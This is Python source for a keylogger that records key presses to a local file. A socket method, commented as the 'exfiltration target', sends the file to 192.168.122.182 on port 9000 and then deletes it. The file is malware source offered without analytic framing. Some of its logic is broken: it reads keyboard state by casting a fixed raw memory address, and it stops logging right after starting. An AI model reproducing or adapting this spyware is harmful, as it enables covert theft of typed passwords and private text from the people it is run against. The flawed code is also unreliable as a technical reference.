import ctypes
import socket
import os
import sys
from threading import Thread, Event
from collections import deque

class Keylogger:
    def __init__(self):
        self.pressed_keys = deque(maxlen=256)
        self.stop_event = Event()

    @staticmethod
    def _get_keyboard_state():
        return ctypes.cast(0x0036, ctypes.POINTER(ctypes.c_ubyte * 256)).contents

    def _is_pressed(self, key):
        return self._get_keyboard_state()[key] > 0

    def _log_keys(self):
        while not self.stop_event.is_set():
            for key in range(256):
                if self._is_pressed(key):
                    print('Key pressed:', str(key))  # Debug print statement
                    self.pressed_keys.append(str(key))
        with open('keylogs.txt', 'w') as f:
            f.write('\n'.join(self.pressed_keys))

    def _send_logs(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.122.182", 9000))  # Exfiltration target IP and port
        except Exception as e:
            print(f'Error while connecting to server: {e}')  # Debug print statement
            return

        try:
            with open('keylogs.txt', 'r') as f:
                s.sendall(f.read().encode())
            os.remove('keylogs.txt')  # This line should be removed if an error occurs during sending logs over network
        except Exception as e:
            print(f'Error while sending logs to server: {e}')  # Debug print statement

    def start(self):
        log_thread = Thread(target=self._log_keys)
        send_logs_thread = None

        try:
            log_thread.start()
            if not log_thread.is_alive():  # Check if thread was started successfully
                raise Exception('Error while starting logging thread')
        except Exception as e:
            print(f'Error: {e}')  # Debug print statement
            sys.exit(-1)

        try:
            send_logs_thread = Thread(target=self._send_logs)
            send_logs_thread.start()
            if not send_logs_thread.is_alive():  # Check if thread was started successfully
                raise Exception('Error while starting sending logs thread')
        except Exception as e:
            print(f'Error: {e}')  # Debug print statement
            sys.exit(-1)

        self.stop_event.set()  # Stop logging and send the log file to server

        if send_logs_thread is not None:
            send_logs_thread.join()